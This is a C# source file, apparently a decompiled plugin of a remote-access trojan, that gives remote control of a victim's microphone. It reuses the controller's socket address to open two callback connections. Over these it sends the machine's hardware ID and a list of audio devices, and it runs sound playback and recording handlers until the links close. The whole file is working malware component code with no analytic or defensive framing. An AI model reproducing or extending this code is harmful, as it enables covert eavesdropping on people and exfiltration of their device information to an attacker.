using System.Collections.Generic;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;
using Plugin.Handler;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client1.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client1.itsConnect)
		{
			Client1.Send(LEB128.Write(new object[4]
			{
				"Microphone",
				"Connect",
				Hwid,
				string.Join(",", (IEnumerable<string?>)HandlerDeviceInfo.Device())
			}));
		}
		Client2.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client2.itsConnect)
		{
			Client2.Send(LEB128.Write(new object[3] { "Microphone", "Connect", Hwid }));
		}
		while (Client1.itsConnect || Client2.itsConnect)
		{
			Thread.Sleep(1000);
		}
		Client1.Disconnect();
		Client2.Disconnect();
		HandlerSoundPlayer.Stop();
		HandlerSoundRecover.Stop();
		Thread.Sleep(5000);
	}
}
